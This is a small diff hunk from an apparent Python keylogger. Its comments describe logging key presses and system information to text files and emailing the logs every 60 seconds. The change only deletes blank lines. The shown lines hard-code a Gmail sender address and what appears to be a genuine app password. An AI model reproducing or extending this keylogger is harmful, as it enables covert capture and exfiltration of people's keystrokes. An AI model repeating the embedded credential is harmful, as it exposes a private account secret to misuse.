@@ -15,9 +15,6 @@ import threading, time # For sending email every 60 seconds (for periodic_email)
 key_info = "key_log.txt" # text file for key presses
 sys_info = "sys_info.txt" # text file for os info 
 
-
-
-
 #These varibals are for the email section, tinker with them for your needs.
 email_sender = "alexsandoval879@gmail.com" #email that will be sending the logs
 email_pass = "gfxn rjsv kfgs ylnp" # app password from email sender gmail. (find in security settings)
